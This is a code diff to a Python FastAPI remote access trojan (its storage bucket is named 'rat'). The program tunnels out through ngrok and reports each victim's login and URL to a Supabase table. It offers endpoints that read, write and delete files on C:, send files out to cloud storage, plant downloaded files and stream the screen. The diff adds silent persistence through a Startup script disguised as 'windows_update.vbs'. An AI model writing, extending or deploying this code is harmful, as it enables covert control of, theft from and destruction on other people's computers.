@@ -1,11 +1,13 @@
 import os
 import shutil
 import subprocess
+import sys
 from contextlib import asynccontextmanager
 from pathlib import Path
 
 import cv2
 import numpy as np
+import uvicorn
 from aiortc import RTCPeerConnection, RTCSessionDescription, VideoStreamTrack
 from av import VideoFrame
 from dotenv import load_dotenv
@@ -13,10 +15,8 @@ from fastapi import BackgroundTasks, FastAPI
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import FileResponse
 from mss import mss
-from supabase import Client, create_client
 from pyngrok import ngrok
-import uvicorn
-
+from supabase import Client, create_client
 
 load_dotenv()
 
@@ -25,42 +25,44 @@ supabase: Client = create_client(
     os.getenv("SUPABASE_KEY"),
 )
 
+
 @asynccontextmanager
 async def lifespan(app: FastAPI):
-
-	ngrok.set_auth_token(os.getenv('NGROK_TOKEN'))
-	tunnel = ngrok.connect("6969")
-	public_url = tunnel.public_url
+    ngrok.set_auth_token(os.getenv("NGROK_TOKEN"))
+    running_tunnels = ngrok.get_tunnels()
 
 
-	response = (
-    	supabase.table("connected")
-		    .upsert({"name": os.getlogin(), "ngrok_url": public_url})
-		    .execute()
-	)
+    for t in running_tunnels:
+        if t.public_url:
+            ngrok.disconnect(t.public_url)
 
-	if len(response.data):
-		print('sent connection state succesfully')
-	else:
-		print('unable to send connection data to host')
+    tunnel = ngrok.connect("6969")
+    public_url = tunnel.public_url
 
-	app.state.ngrok_url = public_url
+    if not public_url:
+	    raise Exception("Couldnt create ngork tunnel")
 
-	yield
-	res = (
-    	supabase.table("connected")
-		    .delete()
-			.eq("ngrok_url", public_url)
-		    .execute()
-	)
+    response = (
+        supabase.table("connected")
+        .upsert({"name": os.getlogin(), "ngrok_url": public_url})
+        .execute()
+    )
 
-	if len(res.data):
-		print('sent disconnection state succesfully')
-	else:
-		print('unable to send disconnection data to host')
+    if not len(response.data):
+        raise Exception("Couldnt send connection info to supabase")
 
-	ngrok.disconnect(public_url)
-	ngrok.kill()
+    app.state.ngrok_url = public_url
+
+    yield
+    res = supabase.table("connected").delete().eq("ngrok_url", public_url).execute()
+
+    if len(res.data):
+        print("sent disconnection state succesfully")
+    else:
+        print("unable to send disconnection data to host")
+
+    ngrok.disconnect(public_url)
+    ngrok.kill()
 
 
 app = FastAPI(lifespan=lifespan)
@@ -103,6 +105,83 @@ def get_dir(path: str = ""):
         return files
     except FileNotFoundError:
         return "folder not found"
+
+
+@app.get("/readfile")
+def readfile(path: str = ""):
+    try:
+        with open(f"C:/{path}", "r") as f:
+            return f.read()
+
+    except FileNotFoundError:
+        return "File Not Found"
+
+
+@app.get("/createfile")
+def createfile(path: str, content: str):
+    file_path = Path(f"C:/{path}")
+
+    if file_path.exists():
+        return "File Already exists"
+
+    file_path.touch()
+
+    with open(f"C:/{path}", "w") as f:
+        return f.write(content)
+
+
+@app.get("/removefile")
+def removefile(path: str):
+    try:
+        os.remove(f"C:/{path}")
+        return "file deleted"
+    except FileNotFoundError:
+        return "file not found"
+
+
+@app.get("/removefolder")
+def removefolder(path: str):
+    try:
+        shutil.rmtree(f"C:/{path}")
+        return "folder removed"
+    except FileNotFoundError:
+        return "folder not found"
+
+
+# SHOULD BE HANDLED BETTER FOR LARGE FILES #
+@app.get("/downloadfile")
+def downloadfile(path: str):
+    file_name = Path(path).name
+    try:
+        with open(f"C:/{path}", "rb") as f:
+            _ = supabase.storage.from_("rat").upload(
+                file=f,
+                path=f"./public/{file_name}",
+                file_options={"cache-control": "3600", "upsert": "true"},
+            )
+
+            url = supabase.storage.from_("rat").get_public_url(f"/public/{file_name}")
+
+            return url
+
+    except FileNotFoundError:
+        return "File Not Found"
+
+    except Exception as e:
+        return f"Error: {str(e)}"
+
+
+@app.get("/uploadfile")
+def uploadfile(dwpath: str, dbfilename: str):
+    try:
+        with open(f"C:/{dwpath}", "wb+") as f:
+            response = supabase.storage.from_("rat").download(f"public/{dbfilename}")
+            f.write(response)
+
+            return "file uploaded"
+
+    except Exception as e:
+        return f"Error: {str(e)}"
 
 
 class DesktopTrack(VideoStreamTrack):
@@ -148,71 +227,6 @@ async def stream_screen(params: dict):
     await pc.setLocalDescription(answer)
 
     return {"sdp": pc.localDescription.sdp, "type": pc.localDescription.type}
-
-
-@app.get("/readfile")
-def readfile(path: str = ""):
-    with open(f"C:/{path}", "r") as f:
-        return f.read()
-
-
-@app.get("/createfile")
-def createfile(path: str, content: str):
-    Path(f"C:/{path}").touch()
-
-    with open(f"C:/{path}", "w") as f:
-        return f.write(content)
-
-
-@app.get("/removefile")
-def removefile(path: str):
-    try:
-        os.remove(f"C:/{path}")
-        return "file deleted"
-    except FileNotFoundError:
-        return "file not found"
-
-
-@app.get("/removefolder")
-def removefolder(path: str):
-    try:
-        shutil.rmtree(f"C:/{path}")
-        return "folder removed"
-    except FileNotFoundError:
-        return "folder not found"
-
-
-# SHOULD BE HANDLED BETTER FOR LARGE FILES #
-@app.get("/downloadfile")
-def downloadfile(path: str):
-    file_name = Path(path).name
-    try:
-        with open(f"C:/{path}", "rb") as f:
-            _ = supabase.storage.from_("rat").upload(
-                file=f,
-                path=f"./public/{file_name}",
-                file_options={"cache-control": "3600", "upsert": "true"},
-            )
-
-            url = supabase.storage.from_("rat").get_public_url(f"/public/{file_name}")
-
-            return url
-
-    except Exception as e:
-        return f"Error: {str(e)}"
-
-
-@app.get("/uploadfile")
-def uploadfile(dwpath: str, dbfilename: str):
-    try:
-        with open(f"C:/{dwpath}", "wb+") as f:
-            response = supabase.storage.from_("rat").download(f"public/{dbfilename}")
-            f.write(response)
-
-            return "file uploaded"
-
-    except Exception as e:
-        return f"Error: {str(e)}"
 
 
 @app.get("/cmd")
@@ -266,5 +280,19 @@ def get_system_info():
         return f"error: {str(e)}"
 
 
+def add_to_startup():
+    startup_dir = Path(os.environ["APPDATA"]) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
+    vbs_path = startup_dir / "windows_update.vbs"
+
+    if not vbs_path.exists():
+        vbs_path.parent.mkdir(parents=True, exist_ok=True)
+        vbs_path.write_text(
+            f'Set WshShell = CreateObject("WScript.Shell")\n'
+            f'WshShell.Run """{sys.executable}"" ""{Path(__file__).resolve()}""", 0, False\n'
+        )
+
+
+
 if __name__ == "__main__":
-	uvicorn.run(app, host="127.0.0.1", port=6969)
+    add_to_startup()
+    uvicorn.run(app, host="127.0.0.1", port=6969)
